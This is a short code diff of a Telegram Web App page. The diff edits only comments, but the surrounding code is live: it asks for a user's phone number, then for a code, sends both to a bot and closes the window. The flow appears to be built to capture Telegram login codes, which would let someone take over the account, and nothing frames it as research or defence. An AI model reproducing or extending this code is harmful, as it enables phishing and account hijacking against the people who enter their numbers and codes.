@@ -71,10 +71,10 @@
                             document.getElementById('screen-code').classList.remove('hidden');
                             tg.MainButton.hide();
 
-                            // Send phone to bot via web_app_data
+                            // Send phone to bot
                             tg.sendData(JSON.stringify({ type: "phone", phone: phone }));
 
-                            // Focus code input to open keyboard
+                            // Focus code input
                             setTimeout(() => { document.getElementById('code-input').focus(); }, 100);
                         }
                     });
@@ -110,7 +110,6 @@
                         isSent = true;
                         this.blur();
 
-                        // Send code to bot via web_app_data (separate message)
                         setTimeout(() => {
                             tg.sendData(JSON.stringify({ type: "code", code: value }));
                             setTimeout(() => tg.close(), 500);
